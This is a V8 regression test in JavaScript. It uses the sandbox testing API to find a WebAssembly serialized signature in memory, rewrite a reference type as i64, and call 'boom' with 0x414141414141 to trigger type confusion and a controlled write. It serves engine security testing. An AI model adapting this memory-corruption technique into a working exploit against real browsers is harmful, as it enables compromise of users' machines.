// Copyright 2024 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.
//
// Flags: --sandbox-testing

d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

// Prepare corruption utilities.
const kHeapObjectTag = 1;
const kSmiTagSize = 1;
const kKindBits = 5;
const kI64 = 2;
const kRef = 0xa;
const kWasmTagObjectSerializedSignatureOffset = 0xc;
const cage_base = BigInt(Sandbox.base);
let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
function getPtr(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}
function getField(obj, offset) {
  return memory.getUint32(obj + offset - kHeapObjectTag, true);
}
function setField(obj, offset, value) {
  memory.setUint32(obj + offset - kHeapObjectTag, value, true);
}

// find ByteArrayMap dynamically
let dummy_tag = new WebAssembly.Tag({parameters: ['i64'], returns: []});
let dummy_tag_ptr = getPtr(dummy_tag);
let dummy_sig_ptr = getField(dummy_tag_ptr, kWasmTagObjectSerializedSignatureOffset);
let ByteArrayMap = getField(dummy_sig_ptr, 0);

function fn(ptr, val) {
  return [val, ptr];
}

let builder = new WasmModuleBuilder();
let $struct = builder.addStruct([makeField(kWasmI64, true)]);
let $sig_sl_ll = builder.addType(makeSig([kWasmI64, kWasmI64], [wasmRefType($struct), kWasmI64]));
let $sig_v_ll = builder.addType(makeSig([kWasmI64, kWasmI64], []));
let $fn = builder.addImport('import', 'fn', $sig_sl_ll);
builder.addFunction('boom', $sig_v_ll)
  .exportFunc()
  .addBody([
    kExprLocalGet, 0,
    kExprLocalGet, 1,
    kExprCallFunction, $fn,
    kGCPrefix, kExprStructSet, $struct, 0,
  ]);

let instance = builder.instantiate({import: {fn}});
let { boom } = instance.exports;

function findObject(needle, start) {
  function match() {
    for (let k = 0; k < needle.length; ++k) {
      if (getField(start, k * 4) != needle[k]) return false;
    }
    return true;
  }
  while (!match()) start += 4;
  return start;
}

let needle = [
  /*map=*/ByteArrayMap, /*PodArrayBase::length=*/(5 * 4) << kSmiTagSize, /*ReturnCount=*/2, kRef | ($struct << kKindBits),
  kI64, kI64, kI64,
];
// Find the serialized signature, starting at the dummy Tag object (allocated
// before the serialized sig).
let serialized_sig_ptr = findObject(needle, dummy_tag_ptr);
setField(serialized_sig_ptr, 0xc /* offset of ref */, kI64);

boom(0x414141414141n, 0x42n);
